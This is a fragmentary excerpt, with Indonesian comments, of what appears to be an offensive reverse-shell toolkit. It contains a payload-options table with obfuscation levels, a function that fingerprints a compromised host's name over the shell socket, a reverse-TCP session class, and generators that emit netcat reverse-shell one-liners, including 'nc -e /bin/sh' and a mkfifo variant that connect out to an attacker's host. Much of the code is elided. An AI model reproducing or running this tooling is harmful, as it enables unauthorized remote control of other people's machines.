...
OPTIONS = {
    ...
    "LANGUAGE": {
        "default": "python",
        "required": False,
        "description": "python|bash|powershell|php|perl|ruby|nodejs|c|cpp|all|lua|java|nc|netcat|none"
    },
    "OBF_LEVEL": {
        "default": "medium",
        "required": False,
...
# Tambahkan fungsi ini di reverse_tcp.py setelah fungsi detect_os_from_socket

def detect_hostname_from_socket(sock, os_type):
    """Detect hostname from socket connection - IMPROVED VERSION"""
    hostname = "unknown"
    
    try:
        if os_type == 'windows':
            # Windows commands to get hostname
            commands = [
                "echo %COMPUTERNAME%",
                "hostname",
                "wmic computersystem get name 2>nul"
            ]
        else:
            # Unix-like commands
            commands = [
            ...
            try:
                ...
                if ready[0]:
                    ...
                    for line in data.split('\n'):
                        ...
                        # Filter valid hostname (alphanumeric, dash, dot, underscore)
                        import re
                        # Clean the line - remove ANSI codes and special chars
                        ...
                        if re.match(r'^[a-zA-Z0-9_\-\.]{2,50}$', clean_line):
                            hostname = clean_line
                            break
                        # Also capture if it's a simple word without spaces
    ...
    # If still unknown, try alternative method: get from prompt
    if hostname == "unknown":
        try:
            # Try to get hostname from shell prompt
            sock.send(b"echo $PS1 2>/dev/null || echo %PROMPT% 2>nul\n")
            time.sleep(0.5)
            ready = select.select([sock], [], [], 1)
            if ready[0]:
                data = sock.recv(1024).decode('utf-8', errors='ignore')
                # Look for hostname in prompt pattern like user@hostname:~
                import re
...
class ReverseTCPSession:
    def __init__(self, session_id, client_socket, client_addr, lhost, lport):
        ...
        self.hostname = detect_hostname_from_socket(client_socket, self.os)  # TAMBAHKAN INI
    ...
    def get_hostname(self):
        """Get hostname of the target - bisa dipanggil kapan saja"""
...
def generate_java(lhost, lport, level, use_b64):
    return f'''java -cp . -Djava.class.path=. Exploit "{lhost}" {lport}'''

def generate_nc(lhost, lport, level, use_b64):
    # Beberapa varian netcat
    return f"nc -e /bin/sh {lhost} {lport} || rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport}>/tmp/f"


# Tambahkan juga varian mkfifo (sh -i)
def generate_nc_mkfifo(lhost, lport, level, use_b64):
    return f"rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f"
